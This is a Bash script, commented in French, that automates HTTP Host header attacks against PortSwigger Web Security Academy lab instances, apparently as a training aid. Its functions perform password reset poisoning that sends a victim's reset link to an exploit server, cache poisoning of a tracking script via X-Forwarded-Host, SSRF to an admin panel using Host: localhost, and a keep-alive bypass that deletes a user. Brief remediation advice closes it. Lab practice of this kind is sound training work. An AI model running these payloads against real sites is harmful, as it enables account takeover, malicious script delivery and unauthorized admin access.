#!/bin/bash

# --------- Configuration à adapter ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
COOKIE="session=<your-session-cookie>"
EXPLOIT_SERVER="exploit-<your-lab>.exploit-server.net"
RESET_PATH="/forgot-password"
TRACKING_PATH="/resources/js/tracking.js"
# -------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Analyse du comportement du Host header
analyze_host_header() {
    print_sep
    echo "[Analyse] Test du comportement du Host header"
    resp=$(curl -sk -I -H "Host: evil.com" "$TARGET_URL")
    if echo "$resp" | grep -iq "Location: http"; then
        echo "  [!] Redirection basée sur Host détectée :"
        echo "$resp" | grep -i "Location:"
    else
        echo "  [-] Pas de redirection évidente sur Host modifié."
    fi
}

# 2. Attaque : Host header injection (password reset poisoning)
attack_password_reset_poison() {
    print_sep
    echo "[Attaque] Password reset poisoning via Host header"
    echo "- Envoi d'une requête de reset avec Host: $EXPLOIT_SERVER"
    curl -sk -X POST -H "Host: $EXPLOIT_SERVER" -H "Content-Type: application/x-www-form-urlencoded" \
        -b "$COOKIE" --data "username=carlos" "$TARGET_URL$RESET_PATH" -o /tmp/reset_resp.html
    echo "  [Contrôle] : Vérifiez les logs de l'exploit server pour la présence d'un lien de reset."
}

# 3. Attaque : cache poisoning via Host/X-Forwarded-Host
attack_cache_poisoning() {
    print_sep
    echo "[Attaque] Cache poisoning via Host/X-Forwarded-Host"
    curl -sk -H "Host: $TARGET_URL" -H "X-Forwarded-Host: $EXPLOIT_SERVER" \
        "$TARGET_URL$TRACKING_PATH?cb=123" -o /tmp/tracking_resp.html
    echo "  [Contrôle] : Ouvrez le tracking.js depuis un navigateur, ou attendez qu'un utilisateur visite la page. Vérifiez si une requête est faite à l'exploit server."
}

# 4. Attaque : SSRF via Host header (host routing)
attack_ssrf_host() {
    print_sep
    echo "[Attaque] SSRF via Host header (host routing)"
    echo "- Envoi d'une requête avec Host: localhost"
    curl -sk -H "Host: localhost" -b "$COOKIE" "$TARGET_URL/admin" -o /tmp/ssrf_resp.html
    if grep -q "Admin" /tmp/ssrf_resp.html; then
        echo "  [+] Accès admin obtenu via SSRF Host header !"
    else
        echo "  [-] Accès admin non obtenu."
    fi
}

# 5. Attaque : Host validation bypass via connection state (keep-alive)
attack_host_validation_bypass() {
    print_sep
    echo "[Attaque] Host validation bypass via connection state (keep-alive)"
    echo "- Cette attaque nécessite un outil bas niveau (netcat, ncat, ou Burp Repeater en mode raw)."
    echo "- Exemple de requêtes à chaîner sur la même connexion :"
    cat <<EOF
GET / HTTP/1.1
Host: $TARGET_URL
Cookie: $COOKIE
Connection: keep-alive

POST /admin/delete HTTP/1.1
Host: localhost
Cookie: $COOKIE
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

csrf=CSRF_TOKEN&username=carlos
EOF
    echo "  [Contrôle] : Vérifiez si la suppression admin fonctionne malgré la validation Host."
}

# 6. Conseils/remédiation
print_remediation() {
    print_sep
    echo "[Remédiation & Conseils]"
    echo "- Ne faites confiance qu'au premier Host header reçu et validez-le strictement côté serveur."
    echo "- Ignorez ou filtrez les headers X-Forwarded-Host, X-Host, X-Forwarded-Server sauf configuration explicite."
    echo "- Ne générez jamais d'URL dynamiquement à partir du Host header sans validation."
    echo "- Pour les labs PortSwigger, vérifiez la propagation du Host dans les liens de reset, scripts, ou redirections."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/host-header"
}

# 7. Synthèse
print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "1. Analyse du comportement du Host header."
    echo "2. Attaques : password reset poisoning, cache poisoning, SSRF, host validation bypass."
    echo "3. Contrôle : vérification des logs exploit server, du cache, ou de l'accès admin."
    echo "4. Application des recommandations de sécurité."
    print_sep
}

# Exécution séquentielle
echo "=== Script PortSwigger HTTP Host Headers : analyse, attaque et contrôle ==="
analyze_host_header
attack_password_reset_poison
attack_cache_poisoning
attack_ssrf_host
attack_host_validation_bypass
print_remediation
print_summary

# End of script
